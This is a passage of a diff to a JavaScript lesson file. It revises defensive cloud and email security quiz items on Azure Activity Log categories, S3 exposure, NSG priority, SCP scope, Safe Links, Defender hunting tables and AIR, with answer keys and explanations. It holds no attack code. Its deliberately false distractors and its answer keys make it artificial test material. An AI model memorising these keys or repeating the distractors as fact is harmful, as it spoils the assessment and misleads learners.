-            "label": "The Recommendation category, because Azure Advisor writes each completed configuration change there once an operation succeeds.",
+            "label": "The Policy category, which logs Azure Policy evaluation results as resources are changed.",
             "value": "c"
           },
           {
-            "label": "The Autoscale category, because scaling events and role assignments are grouped together under one heading in the Activity Log.",
+            "label": "The ResourceHealth category, which reports the health and availability status of each resource.",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "The Administrative category captures every create/update/delete/action through Azure Resource Manager plus all Azure RBAC role changes, so it is where privilege and configuration changes appear. ServiceHealth records Azure-side service incidents, not user changes. Recommendation holds Azure Advisor guidance, not operations. Autoscale records only scale-in/scale-out events. Only Administrative (with Security for Defender for Cloud alerts) carries real investigative weight."
+        "explanation": "Correct: role assignments and resource create/update/delete operations are recorded in the Administrative category, the primary hunting ground for privilege and configuration changes. The Security category holds Defender for Cloud alerts and posture findings — useful to correlate, but it does not record the RBAC assignment itself. The Policy category shows when a guardrail allowed or denied a change, not who was granted Owner. The ResourceHealth category reports whether resources are healthy, which helps rule out an outage but carries no role-assignment evidence."
       }
     ],
     "references": [
@@ -5579,119 +5579,119 @@ const NEW_TOPIC_LESSONS = [
     ],
     "quiz": [
       {
-        "question": "A security review finds an S3 bucket containing customer records that anyone on the internet can list and download without any credentials. Which combination of settings most directly produces this dangerous public exposure?",
+        "question": "A security review finds an S3 bucket of customer records that anyone on the internet can list and download with no credentials at all. Which combination of settings most directly produces this?",
         "options": [
           {
-            "label": "The bucket is in an unused AWS region, which automatically makes all objects readable by anonymous users across the public internet by default.",
+            "label": "An ACL grants AuthenticatedUsers read, so any signed-in AWS user can download, while Block Public Access is on",
             "value": "a"
           },
           {
-            "label": "A bucket policy or ACL grants read to everyone (AllUsers / principal *) while Block Public Access is disabled, so anonymous internet users can access it.",
+            "label": "A bucket policy or ACL grants read to everyone (Principal * / AllUsers) while Block Public Access is turned off",
             "value": "b"
           },
           {
-            "label": "The bucket uses pre-signed URLs, which by design make every object permanently and publicly downloadable to anyone who visits the storage endpoint.",
+            "label": "Pre-signed URLs were issued for a few objects, and each one leaves the whole bucket listable by whoever holds it",
             "value": "c"
           },
           {
-            "label": "The bucket owner enabled Block Public Access, which in AWS is the setting that grants the AllUsers group full read access to the contents.",
+            "label": "Objects use SSE-S3 rather than SSE-KMS encryption, so they are served unencrypted to anyone who requests them",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "Public exposure happens when a bucket policy or ACL grants read to everyone (AllUsers / the * principal) and the Block Public Access guardrail is off, letting anonymous internet users list and download objects. The 'unused AWS region' option is wrong because region does not control public access. The pre-signed URL option misdescribes pre-signed URLs, which grant temporary, scoped access to a single object rather than making everything public. The claim that Block Public Access grants AllUsers read inverts reality — Block Public Access prevents public exposure, it does not grant it."
+        "explanation": "Anonymous exposure needs two things together: a policy or ACL granting read to everyone (Principal * or AllUsers) and the Block Public Access guardrail switched off. An AuthenticatedUsers grant still requires an AWS credential, which contradicts “no credentials”, and Block Public Access being on would block public grants anyway. A pre-signed URL gives temporary access to one specific object; it does not open the bucket. Encryption at rest protects stored data, not access: it does nothing against an over-broad policy, and the choice of SSE-S3 does not itself make anything public."
       },
       {
-        "question": "In the activity log you see an AuthorizeSecurityGroupIngress call adding an inbound rule that allows TCP port 3389 from 0.0.0.0/0, made by an unfamiliar identity from a foreign IP. Why is this a high-priority finding?",
+        "question": "CloudTrail shows AuthorizeSecurityGroupIngress adding inbound TCP 3389 from 0.0.0.0/0 to the security group of a Windows server. The call was made by an unfamiliar identity from a foreign IP. Which response is most appropriate?",
         "options": [
           {
-            "label": "It is low priority, because 0.0.0.0/0 restricts access to a single trusted address and port 3389 is only ever used for encrypted internal backups.",
+            "label": "Re-enable Block Public Access on the account, which closes the new inbound path to the server",
             "value": "a"
           },
           {
-            "label": "It exposes RDP to the entire internet, inviting brute-force and exploitation, and the unfamiliar actor and origin suggest an attacker opening a way in.",
+            "label": "Remove or scope the rule, then check the host for RDP logons and what else that identity changed",
             "value": "b"
           },
           {
-            "label": "It simply enables outbound web browsing from the host, so the only concern is potential data usage costs rather than any security exposure at all.",
+            "label": "Keep the rule, since the group’s implicit deny still blocks any source that is not a known host",
             "value": "c"
           },
           {
-            "label": "It automatically closes port 3389 to the internet, so the finding is merely a routine hardening action that needs no further investigation by the SOC.",
+            "label": "Wait for a GuardDuty access finding before acting, since an open rule alone is a posture issue",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "Source 0.0.0.0/0 means the entire internet, and port 3389 is RDP; opening RDP to the world invites brute-force and exploitation, while the unfamiliar identity and foreign origin suggest an attacker creating an entry point — a high-priority finding. The 'low priority' option misstates 0.0.0.0/0 as a single address and 3389 as backups. The 'outbound web browsing' option wrongly frames an inbound RDP rule as outbound browsing. The 'automatically closes port 3389' option reverses the effect: the rule opens the port, it does not close it."
+        "explanation": "Port 3389 is RDP and 0.0.0.0/0 is the whole internet, so this rule exposes remote desktop to every scanner, and an unfamiliar identity from a foreign IP suggests someone opening a way in. Close or scope the rule first, then assess impact: look for RDP logon success or unexpected processes on the host and review the identity’s other changes. Block Public Access is an S3 storage guardrail and has no effect on security groups. In an AWS security group any allow rule permits the traffic, so the implicit deny does not filter what this rule allows. Waiting for evidence of access leaves the door open; change events exist so you can act at the moment of exposure."
       },
       {
-        "question": "A bucket's IAM-attached role policies all look correctly scoped, yet the bucket's contents are still downloadable by anyone with no AWS account. What most likely explains this, and where should the analyst look next?",
+        "question": "Every IAM user and role policy that touches a bucket looks correctly scoped, yet the bucket’s contents can be downloaded by people with no AWS account. What most likely explains this, and where should the analyst look next?",
         "options": [
           {
-            "label": "This is impossible; if every identity-based policy is scoped correctly, the bucket cannot be publicly accessible under any circumstances.",
+            "label": "An SCP that should deny public reads is missing, so outsiders get the org’s default allow; review the SCPs",
             "value": "a"
           },
           {
-            "label": "The bucket's own resource-based policy likely grants access independently, such as Principal: * — check the bucket policy itself, not just IAM.",
+            "label": "The bucket’s own resource-based policy grants access separately, e.g. Principal: *; review the bucket policy",
             "value": "b"
           },
           {
-            "label": "The exposure must be caused by a security group rule, since bucket contents can only ever be exposed through network-layer firewall settings.",
+            "label": "The S3 VPC endpoint policy is too broad and lets internet traffic in; review the endpoint policy",
             "value": "c"
           },
           {
-            "label": "AWS support must have manually disabled the account's IAM system, since resource-based policies were deprecated and no longer affect access.",
+            "label": "A security group in front of the bucket allows 0.0.0.0/0 on port 443; review the group’s inbound rules",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "Identity-based and resource-based policies are evaluated independently; a bucket policy with Principal: * grants public access on its own, regardless of how tightly any IAM user or role policy is scoped, so the analyst must check the bucket policy itself. Calling it impossible wrongly assumes locked-down IAM guarantees a private bucket. The security-group option misapplies security groups, which do not govern S3 access. The AWS-support option invents a deprecation that has not happened."
+        "explanation": "Identity-based and resource-based policies are separate paths: a bucket policy with Principal: * lets anyone in regardless of how tightly the IAM policies are scoped, so the bucket policy (and ACLs) are the next stop. SCPs apply only to principals inside the organization and there is no organization-wide default allow, so a missing SCP cannot explain outsiders’ access. A VPC endpoint policy governs traffic that comes through that endpoint from inside the VPC, not requests from the internet. Security groups control network access to resources such as virtual machines; they are not what governs who may read an S3 bucket."
       },
       {
-        "question": "An Azure NSG has the built-in default rule DenyAllInBound at priority 65500, plus a custom rule at priority 100 that allows TCP 3389 from Any. Which rule governs inbound RDP to the host, and why?",
+        "question": "An Azure NSG has the built-in default rule DenyAllInBound at priority 65500 and a custom rule at priority 100 that allows TCP 3389 from Any. Which rule governs inbound RDP to the host, and why?",
         "options": [
           {
-            "label": "The custom rule at priority 100 governs it: NSGs evaluate rules by priority with the lowest number first, so it wins over the default deny and RDP is open to the entire internet.",
+            "label": "The custom rule at 100: the lowest priority number is evaluated first and wins, so RDP is open to the internet",
             "value": "a"
           },
           {
-            "label": "The default DenyAllInBound rule governs it, because built-in default rules can never be overridden by any custom rule an administrator adds to an NSG.",
+            "label": "DenyAllInBound, because an explicit deny overrides any allow, the same way it does in AWS IAM evaluation",
             "value": "b"
           },
           {
-            "label": "Neither rule governs it, because an NSG that contains both an allow and a deny rule for the same port disables itself until an administrator resolves the conflict.",
+            "label": "DenyAllInBound, because a higher priority number marks the more important rule, so 65500 outranks 100",
             "value": "c"
           },
           {
-            "label": "Both rules apply equally and cancel out, so the host falls back to allowing only encrypted RDP sessions from previously seen source addresses.",
+            "label": "DenyAllInBound, because Azure checks its built-in default rules before it evaluates any custom rule",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "NSG rules are evaluated in priority order, and a lower priority number is evaluated first and wins. The custom rule at priority 100 is processed before the default DenyAllInBound at 65500, so it takes effect and exposes RDP to the whole internet. The claim that default rules can never be overridden is false — custom rules at a lower number override defaults, which is the whole point of priorities. The remaining options invent behaviours (self-disabling on conflict, encrypted-only fallback) that NSGs do not have."
+        "explanation": "NSG rules are processed in priority order, lowest number first, and the first match decides. The custom allow at 100 matches RDP long before the default DenyAllInBound at 65500 is reached, so RDP is open to the internet. “Explicit deny wins” is the AWS IAM policy rule, not how NSGs resolve rules. Reading 65500 as the higher priority reverses the scale: a larger number means it is evaluated later. Default rules sit at the bottom of the order precisely so that custom rules with lower numbers are checked first."
       },
       {
-        "question": "An S3 bucket policy contains an Allow for Principal: *, but a Service Control Policy at the AWS Organizations level contains an explicit Deny for public S3 access. Under AWS policy evaluation, what is the result for an anonymous internet request?",
+        "question": "An S3 bucket policy contains an Allow for Principal: *. A Service Control Policy at the AWS Organizations level contains an explicit Deny for public S3 access. Under AWS policy evaluation, what happens to an anonymous internet request for an object?",
         "options": [
           {
-            "label": "The request is denied, because an explicit Deny in any applicable policy always overrides any Allow, no matter where the Allow appears.",
+            "label": "Denied: an explicit Deny in any policy overrides every Allow, so the SCP’s Deny beats the bucket policy",
             "value": "a"
           },
           {
-            "label": "The request is allowed, because a resource-based bucket policy with Principal: * is evaluated last and therefore overrides any Service Control Policy above it.",
+            "label": "Allowed: a same-account resource-based policy overrides an SCP whenever the two of them disagree",
             "value": "b"
           },
           {
-            "label": "The request is allowed, because an SCP only restricts IAM users and roles in the organization's member accounts; it does not apply to an anonymous caller reaching the bucket through its resource-based policy.",
+            "label": "Allowed: an SCP restricts only IAM principals in the org’s member accounts, so it never applies to this caller",
             "value": "c"
           },
           {
-            "label": "The result is undefined and depends on which policy was written most recently, since AWS resolves Allow-versus-Deny conflicts by comparing timestamps.",
+            "label": "Denied: the SCP is evaluated before the bucket policy, and an SCP must allow a request for it to proceed",
             "value": "d"
           }
         ],
         "answer": "c",
-        "explanation": "An explicit Deny does beat any Allow, but only in a policy that actually applies to the request. SCPs apply only to IAM users and roles managed by the organization's member accounts; they do not affect users from outside the organization or anonymous callers, and they do not filter resource-based policies directly. The anonymous GetObject is therefore granted by the bucket policy's Principal: * despite the SCP. What an SCP can do is stop your own principals from creating the exposure (deny s3:PutBucketPolicy); to block the outside path you need Block Public Access, an explicit Deny in the bucket policy itself, or a Resource Control Policy. The 'explicit Deny always wins' option ignores that the SCP never applies to this caller. The 'bucket policy is evaluated last' option invents an ordering rule. The timestamp option invents a resolution mechanism that does not exist."
+        "explanation": "An explicit Deny beats any Allow only in a policy that applies to the request. SCPs restrict IAM users and roles in the organization’s member accounts; they do not apply to anonymous or outside callers, so the bucket policy’s Principal: * grants the request. An SCP can stop your own principals from creating the exposure (for example by denying s3:PutBucketPolicy); the outside path is closed by Block Public Access, a Deny in the bucket policy itself, or a Resource Control Policy. The “explicit Deny always wins” option ignores that the SCP never applies to this caller. A resource policy does not override an SCP; the SCP simply is not in scope. The “SCP must allow” step applies only to principals the SCP governs, which an anonymous caller is not."
       }
     ],
     "references": [
@@ -5756,142 +5756,142 @@ const NEW_TOPIC_LESSONS = [
     ],
     "quiz": [
       {
-        "question": "A phishing email contains a link that pointed to a harmless page when it was delivered on Monday, but the attacker replaced that page with a credential-harvesting site on Tuesday. How does Safe Links protect a user who clicks the link on Tuesday, and why does a one-time delivery scan fail here?",
+        "question": "A phishing email contains a link that pointed to a harmless page when it was delivered on Monday, but the attacker replaced that page with a credential-harvesting site on Tuesday. How does Safe Links protect a user who clicks the link on Tuesday?",
         "options": [
           {
-            "label": "Safe Links deletes every email that contains any URL on arrival, so the malicious message was already removed before the user could ever click it.",
+            "label": "Safe Links scanned the URL at delivery and stored that verdict, so Tuesday's click is checked against Monday's result",
             "value": "a"
           },
           {
-            "label": "Safe Links rewrites the URL and checks the live destination at click time, so it catches the now-malicious site that a one-time delivery-time scan would have missed.",
+            "label": "Safe Links rewrote the URL, so Tuesday's click goes to Microsoft first and is checked against the destination's live verdict",
             "value": "b"
           },
           {
-            "label": "Safe Links permanently blocks the user's browser from opening any external website, which is why no phishing page can ever load after an email is received.",
+            "label": "Safe Links held the message until scanning completed, so the weaponised page was caught before Monday's delivery",
             "value": "c"
           },
           {
-            "label": "Safe Links scans the link only once when the mail arrives, so on Tuesday it relies entirely on the user noticing the page looks suspicious before entering credentials.",
+            "label": "Safe Attachments detonated the linked page when the mail arrived, and Safe Links now blocks the click on that verdict",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "Safe Links rewrites URLs so a click is checked against the destination's live reputation at click time, which catches a link that was benign at delivery but weaponised later — exactly the time-of-click trick a single delivery-time scan cannot stop. The 'deletes every email containing a URL' option is wrong because Safe Links does not delete all mail containing URLs. The browser-blocking option invents a total browser block that does not exist. The 'scans the link only once' option describes the very failure mode Safe Links is designed to overcome, not how it works."
+        "explanation": "Safe Links rewrites URLs so every click is routed through Microsoft's checking service and evaluated against the destination's current reputation at click time, which catches a link that was harmless at delivery and weaponised later. The 'stored Monday verdict' option describes exactly the one-time delivery scan that this trick defeats. The 'wait for scanning before delivering' option names a real setting, but on Monday the page was still harmless, so a delivery-time scan would have passed it. The Safe Attachments option fails for the same reason: anything analysed on Monday saw the harmless page, and Safe Attachments detonates files rather than producing the click verdict."
       },
       {
-        "question": "During a phishing investigation you confirm 40 users received the same malicious link. Which Microsoft Defender for Office 365 data source best tells you which of those users actually clicked it, so you can prioritise password resets?",
+        "question": "During a phishing investigation you confirm 40 users received the same malicious link. Which Microsoft Defender for Office 365 hunting table best tells you which of those users actually clicked it, so you can prioritise password resets?",
         "options": [
           {
-            "label": "The DeviceProcessEvents table, because it records every process launched on endpoints and therefore lists which users opened the phishing email in Outlook.",
+            "label": "EmailEvents, because its DeliveryAction column shows which of the 40 recipients went on to open the link",
             "value": "a"
           },
           {
-            "label": "The UrlClickEvents table, because Safe Links records who clicked which URL and when, and whether the click was allowed or blocked.",
+            "label": "UrlClickEvents, because Safe Links records who clicked which URL, when, and whether the click was allowed",
             "value": "b"
           },
           {
-            "label": "The Azure Activity Log, because it captures all management-plane API calls and therefore includes every email link a user chose to open.",
+            "label": "EmailUrlInfo, because it lists each URL in a message together with the recipients who later followed it",
             "value": "c"
           },
           {
-            "label": "The Safe Attachments detonation report, because sandbox analysis of the attachment reveals the full list of recipients who later clicked the message's link.",
+            "label": "EmailPostDeliveryEvents, because it records each action taken on the message after it reached a mailbox",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "UrlClickEvents is the Safe Links click record: it captures who clicked which URL, when, and the verdict, which is exactly what you need to separate users who merely received the link from those who engaged with it. DeviceProcessEvents tracks endpoint processes, not email clicks. The Azure Activity Log records cloud management API calls, not email link clicks. Safe Attachments detonates files and does not track who clicked a link."
+        "explanation": "UrlClickEvents is the Safe Links click record (AccountUpn, Url, ActionType, IsClickedThrough), which is what separates users who merely received the link from those who engaged with it. EmailEvents is the scoping table: it tells you who received the message and what delivery action was taken, not who clicked. EmailUrlInfo lists the URLs a message carried, keyed by NetworkMessageId, with no record of clicks. EmailPostDeliveryEvents records remediation after delivery (manual remediation, Phish ZAP, Malware ZAP), not user clicks."
       },
       {
-        "question": "A message with no malicious link or attachment arrives claiming to be from the CFO, asking finance staff to urgently change a wire transfer's destination account. Which MDO control is specifically designed to catch this kind of attack?",
+        "question": "A message with no link or attachment arrives with the CFO's display name, sent from c0ntoso-finance.com (the company's real domain is contoso.com). It asks finance staff to urgently change a wire transfer's destination account. Which MDO control is designed to catch this?",
         "options": [
           {
-            "label": "Safe Attachments, because sandbox detonation of the message body reveals text-based social-engineering requests the same way it detects malware.",
+            "label": "Spoof intelligence alone, because the message forges the company's own contoso.com domain in its From address",
             "value": "a"
           },
           {
-            "label": "Impersonation protection and spoof intelligence, because they analyse display name, domain, and sender patterns rather than needing a malicious payload to detect.",
+            "label": "Impersonation protection, which checks the display name and lookalike domain against protected users and domains",
             "value": "b"
           },
           {
-            "label": "Dynamic Delivery, because it always blocks any email discussing financial transactions regardless of sender identity or content.",
+            "label": "A DMARC reject policy on contoso.com, because receivers then reject any message that fails SPF/DKIM alignment",
             "value": "c"
           },
           {
-            "label": "Zero-hour Auto Purge, because it prevents any message from ever reaching a mailbox in the first place, so this email could never have been delivered.",
+            "label": "Zero-hour Auto Purge, which inspects every message for impersonation before it is allowed to reach the inbox",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "Impersonation protection and spoof intelligence are built for exactly this case: pure social engineering with no malware or malicious link, judged by display name, domain, and communication-pattern anomalies rather than payload behaviour. Safe Attachments only analyses files, not plain-text requests. Dynamic Delivery is a delivery timing mechanism, not a content filter for financial topics. ZAP acts on mail after delivery, not before."
+        "explanation": "This is payload-free business email compromise from a lookalike domain. Impersonation protection is built for it: user impersonation compares the display name with the protected-user list (the CFO), and domain impersonation catches lookalikes such as c0ntoso-finance.com, with no malicious payload needed. The spoof intelligence option misreads the sender: the message does not forge contoso.com itself, it comes from a different, lookalike domain. The DMARC option has the same flaw: contoso.com's DMARC policy only governs mail that claims to be from contoso.com, and a lookalike domain can pass its own SPF and DKIM. The ZAP option gets the timing wrong: ZAP acts on mail after delivery, when a verdict changes, and is not an impersonation check."
       },
       {
-        "question": "An incident report asks whether a phishing message that was later found malicious was ever actually purged from mailboxes, and where it was sitting when that happened. Which advanced hunting table answers this directly?",
+        "question": "An incident report asks whether a phishing message that was later found malicious was actually purged from mailboxes, and where it was sitting when that happened. Which advanced hunting table answers this directly?",
         "options": [
           {
-            "label": "EmailEvents, because it permanently updates its DeliveryAction column in place whenever ZAP purges a message from any mailbox.",
+            "label": "EmailEvents, because its DeliveryAction column records the delivery decision made as each message arrived",
             "value": "a"
           },
           {
-            "label": "EmailPostDeliveryEvents, because its ActionType and DeliveryLocation columns record ZAP and manual remediation actions taken after delivery.",
+            "label": "EmailPostDeliveryEvents, because ActionType and DeliveryLocation record ZAP and manual remediation",
             "value": "b"
           },
           {
-            "label": "DeviceProcessEvents, because it logs every mail client action, including when a user's Outlook process deletes a message from a folder.",
+            "label": "UrlClickEvents, because a ClickBlocked row shows the message was removed once its link turned malicious",
             "value": "c"
           },
           {
-            "label": "EmailUrlInfo, because it tracks which quarantine folder a message was moved to whenever a URL inside it is judged malicious.",
+            "label": "EmailUrlInfo, because joined on NetworkMessageId it marks messages whose URL was later judged malicious",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "EmailPostDeliveryEvents is built specifically for this: its ActionType column records Manual remediation, Phish ZAP, and Malware ZAP events, and DeliveryLocation shows where the message was (Inbox, Quarantine, Junk, etc.) when the action occurred. EmailEvents only records the original delivery decision and is not updated afterward. DeviceProcessEvents is endpoint telemetry, not email. EmailUrlInfo lists URLs contained in messages, not post-delivery remediation actions."
+        "explanation": "EmailPostDeliveryEvents is the remediation record: its ActionType column records Manual remediation, Phish ZAP and Malware ZAP, and DeliveryLocation shows where the message was (Inbox, Quarantine, Junk, Deleted Items) when the action happened. The EmailEvents option describes the delivery decision on arrival, which answers who received the message, not what was done to it afterwards. The UrlClickEvents option confuses a blocked click with a purged message; a click verdict says nothing about whether the email was removed. The EmailUrlInfo option describes the table of URLs a message carried, which holds no post-delivery actions."
       },
       {
-        "question": "A Safe Attachments policy can use Block or Dynamic Delivery. For a legitimate email that happens to carry an attachment still being detonated, what is the key difference in user experience between the two?",
+        "question": "A Safe Attachments policy can use Block or Dynamic Delivery. For a legitimate email whose attachment is still being detonated, what is the key difference in user experience between the two?",
         "options": [
           {
-            "label": "With Block the entire message is withheld until detonation returns a verdict, while Dynamic Delivery sends the body immediately with a placeholder and releases the attachment once it is judged safe.",
+            "label": "Block holds the whole message until the verdict; Dynamic Delivery sends the body now with a placeholder",
             "value": "a"
           },
           {
-            "label": "Block deletes the message permanently the instant it arrives, whereas Dynamic Delivery forwards the message unscanned and only inspects the attachment days later during a scheduled batch job.",
+            "label": "Block holds the whole message; Dynamic Delivery delivers it with the attachment and scans it afterwards",
             "value": "b"
           },
           {
-            "label": "There is no difference in experience; the two names are interchangeable labels for the identical behaviour and Microsoft keeps both purely for backward compatibility with old policies.",
+            "label": "Block delivers the body at once but strips the attachment, substituting a .txt notice in its place",
             "value": "c"
           },
           {
-            "label": "Block encrypts every attachment before delivery, while Dynamic Delivery strips all attachments and replaces each one with a permanent read-only link to an external portal.",
+            "label": "Block delivers the message straight away and just records what the attachment did in detonation",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "Both actions withhold a genuinely malicious attachment, but they differ on the harmless body: Block holds the whole message until detonation finishes, while Dynamic Delivery delivers the body immediately with a placeholder and makes the attachment available once it is judged safe, avoiding inbox delay. The 'Block deletes permanently' option invents permanent deletion and unscanned forwarding. The claim that the names are interchangeable is wrong because the behaviours genuinely differ. The encrypt-versus-strip option fabricates encryption and external-portal replacement."
+        "explanation": "Both live actions withhold a malicious attachment; they differ on the harmless body. Block holds the entire message until detonation returns a verdict, while Dynamic Delivery delivers the body immediately with a placeholder and releases the attachment only once it is judged safe. The 'delivers it with the attachment and scans afterwards' option is a common misreading of Dynamic Delivery: the attachment is never released before the verdict. The 'strips the attachment and substitutes a .txt notice' option describes the retired Replace action. The 'delivers straight away and just records' option describes the retired Monitor action, which was automatically converted to Block."
       },
       {
         "question": "In UrlClickEvents, a row for a phishing link shows ActionType ClickBlocked and IsClickedThrough set to true. What does this most likely mean for that user, and how should you treat them?",
         "options": [
           {
-            "label": "The user was shown the Safe Links warning page and chose to proceed to the destination anyway, so treat them as likely exposed and prioritise a password reset and sign-in review.",
+            "label": "They saw the Safe Links warning page and continued anyway, so treat them as exposed and reset the password",
             "value": "a"
           },
           {
-            "label": "The user never saw the link because Safe Links silently deleted the entire email, so no follow-up of any kind is required for this particular account.",
+            "label": "The click was blocked so the site was not reached, making the account protected and a lower priority",
             "value": "b"
           },
           {
-            "label": "The click was fully blocked by tenant policy and the user reached nothing, so this account is confirmed safe and can be removed from the investigation entirely.",
+            "label": "The block came from the tenant's own URL policy, not reputation, so the user is protected by configuration",
             "value": "c"
           },
           {
-            "label": "The value simply indicates the mail server was briefly offline, so it carries no security meaning and should be ignored during the phishing triage.",
+            "label": "The destination returned an error page, so exposure is unconfirmed until proxy or EDR logs are checked",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "ClickBlocked means Safe Links blocked the click and showed its warning page, and IsClickedThrough set to true means the user chose 'Continue anyway' and proceeded past it — so they likely reached the malicious destination and should be treated as exposed, warranting a password reset and sign-in review. The 'silently deleted the email' option describes deletion that did not occur. The 'fully blocked by tenant policy' option describes ClickBlockedByTenantPolicy, not this combination. The 'mail server offline' option dismisses a genuine engagement signal as a server outage."
+        "explanation": "ClickBlocked means Safe Links blocked the click and showed its warning page; IsClickedThrough = true means the user chose 'Continue anyway' and proceeded past it, so they likely reached the malicious page and need a password reset and sign-in review. The 'site was not reached' option reads ActionType alone and ignores the IsClickedThrough flag, which is the column that changes the verdict. The tenant-policy option describes a different value, ClickBlockedByTenantPolicy. The error-page option describes the UrlErrorPage value, which this row does not show."
       }
     ],
     "references": [
@@ -5953,142 +5953,142 @@ const NEW_TOPIC_LESSONS = [
     ],
     "quiz": [
       {
-        "question": "In Microsoft Defender XDR, what fundamentally distinguishes an 'incident' from an 'alert', and why does working at the incident level matter for a SOC analyst?",
+        "question": "Within two hours, three alerts fire: MDO 'Malicious URL clicked' for user r.katz, Entra ID Protection 'Unfamiliar sign-in properties' for r.katz, and MDE 'Suspicious PowerShell command line' on FIN-LAPTOP-07, where r.katz is signed in. What should you expect to find in the Defender portal?",
         "options": [
           {
-            "label": "An incident is a lower-severity version of an alert, so analysts work the alert queue first and only review incidents when they have spare time between cases.",
+            "label": "Three separate incidents, because each alert came from a different sensor and incidents are built per product.",
             "value": "a"
           },
           {
-            "label": "An incident is a collection of related alerts auto-grouped as one attack, giving the correlated story and scope that individual alert fragments cannot provide on their own.",
+            "label": "One incident, because the alerts share entities (r.katz and the device), so Defender groups them as one attack.",
             "value": "b"
           },
           {
-            "label": "An incident is a single detection from one product, while an alert always spans several products, so alerts are the broader and more useful unit to triage.",
+            "label": "One incident, but only after an analyst links the three alerts by hand, since correlation is a manual triage step.",
             "value": "c"
           },
           {
-            "label": "An incident and an alert are identical in Defender; the two words are interchangeable labels for the same object shown in different parts of the portal.",
+            "label": "One High-severity alert, because Defender merges related detections into a single alert with a higher severity.",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "An incident is a set of related alerts that Defender automatically correlates (by shared entities or attack sequence) into one case, providing the end-to-end attack story and scope that isolated alerts cannot, which is why mature SOCs triage at the incident level. Calling an incident a lower-severity alert inverts severity and workflow. The single-detection-incident option reverses the definitions — the alert is the single detection, not the incident. The claim that they are identical is false because the two are distinct objects."
+        "explanation": "An incident is a set of related alerts that Defender groups automatically when they share entities (the same user, device, file or IP) or fit a known attack sequence. Here r.katz and FIN-LAPTOP-07 link all three alerts into one case. \"Three separate incidents\" is wrong: cross-product correlation is the whole point of XDR, and alerts from different sensors are grouped when they share entities. \"Only after an analyst links the three alerts by hand\" is wrong: the grouping is automatic; the analyst works the incident that results. \"One High-severity alert\" confuses the two objects: the alerts stay separate detections inside the incident, and the incident carries a severity aggregated from them."
       },
       {
-        "question": "An incident flags a malicious executable on a laptop. You open the device timeline and want to determine how the file got there. Which capability of the timeline most directly reveals the root cause?",
+        "question": "An incident flags update.exe in %TEMP% on a laptop. You want to establish how the file got there and what launched the chain. Which pivot most directly answers that?",
         "options": [
           {
-            "label": "The alert severity score, because a High rating on the timeline automatically identifies which phishing email delivered the file to the device.",
+            "label": "The alert's severity and MITRE technique tags, which state the delivery method that placed the file on disk.",
             "value": "a"
           },
           {
-            "label": "The chronological process tree showing parent-child relationships, letting you walk back to see, for example, a Word document spawning PowerShell that fetched the file.",
+            "label": "The device timeline's process events, walking parent-child links back from update.exe to the process that wrote it.",
             "value": "b"
           },
           {
-            "label": "The incident's aggregated severity, because summing the severities of all member alerts pinpoints the exact process that first wrote the malicious file to disk.",
+            "label": "The device's logon events, which show which user account was signed in when update.exe first appeared.",
             "value": "c"
           },
           {
-            "label": "The list of other devices in the incident, because comparing device names alone reveals which machine originally created and distributed the executable.",
+            "label": "The device's network events alone, finding the first outbound connection made before update.exe appeared.",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "The device timeline records events chronologically with process parent-child relationships, so you can walk backward from the malicious file to the process tree that produced it — for example a Word document spawning PowerShell that downloaded it — revealing initial access and execution. The alert severity score option is wrong because a severity score does not identify a delivery email. The remaining options describe aggregated severity and device lists, which do not reconstruct the on-device execution chain that the timeline's process tree provides."
+        "explanation": "The device timeline records process events with their parent-child relationships, so you can walk back from the file-creation event to the process that wrote update.exe, for example powershell.exe, and on to its parent, for example WINWORD.EXE opening a macro document. That chain is the root cause. \"Severity and MITRE technique tags\" is wrong: they classify and prioritise the alert but do not reconstruct the chain on the device. \"Logon events\" is wrong: knowing who was signed in is useful context, but it does not show which process created the file. \"Network events alone\" is wrong: a connection tells you where the device talked, but without process events you cannot tell which program made it or what it led to."
       },
       {
-        "question": "AIR automatically investigates an alert, concludes a file is malicious, and queues a remediation action pending analyst approval. What is the analyst's most appropriate role at this point?",
+        "question": "AIR investigates an alert, returns a Malicious verdict for a file on one device, and queues a quarantine action awaiting approval. The incident lists the same user as signed in to three other devices. What is the analyst's most appropriate next step?",
         "options": [
           {
-            "label": "Ignore the pending action entirely, since AIR's verdicts always execute automatically regardless of whether an analyst reviews them.",
+            "label": "Approve the action straight away, since a Malicious verdict means AIR has already confirmed the evidence is bad.",
             "value": "a"
           },
           {
-            "label": "Review the investigation graph and evidence, then approve or reject the action, checking whether the same threat exists on other devices AIR did not examine.",
+            "label": "Review AIR's graph and evidence, approve or reject the action, then check the other devices AIR did not examine.",
             "value": "b"
           },
           {
-            "label": "Manually redo the entire investigation from scratch without looking at anything AIR produced, since automated findings can never be trusted in any case.",
+            "label": "Reject the action and isolate the device by hand, since automated remediation should not run on user laptops.",
             "value": "c"
           },
           {
-            "label": "Immediately close the incident as resolved, because a pending AIR action means the threat has already been fully remediated across the environment.",
+            "label": "Resolve the incident now, since AIR has identified the file and queued the fix that will remove it from the device.",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "When AIR queues an action for approval, the analyst's job is to review its investigation graph and evidence, approve or reject the action, and check for related activity on other devices AIR may not have covered. Ignoring the pending action contradicts the fact that approval is required before the action executes. Redoing the investigation from scratch wastes the value AIR provides by discarding its findings unnecessarily. Closing the incident as resolved is wrong because a pending action has not yet executed and does not mean remediation is complete."
+        "explanation": "AIR removes the repetitive first pass, but the analyst still reviews its investigation graph and evidence, approves or rejects pending actions, and checks whether AIR's reach covered every affected asset. A user signed in to three other devices is exactly the scope gap the lesson warns about. \"Approve the action straight away\" is wrong: it may be the right action, but approving without review skips both the evidence check and the scope check. \"Reject the action and isolate the device by hand\" is wrong: there is no rule against AIR remediating laptops, and isolation alone does not address the other three devices. \"Resolve the incident now\" is wrong: a pending action has not run yet, and the other devices have not been assessed."
       },
       {
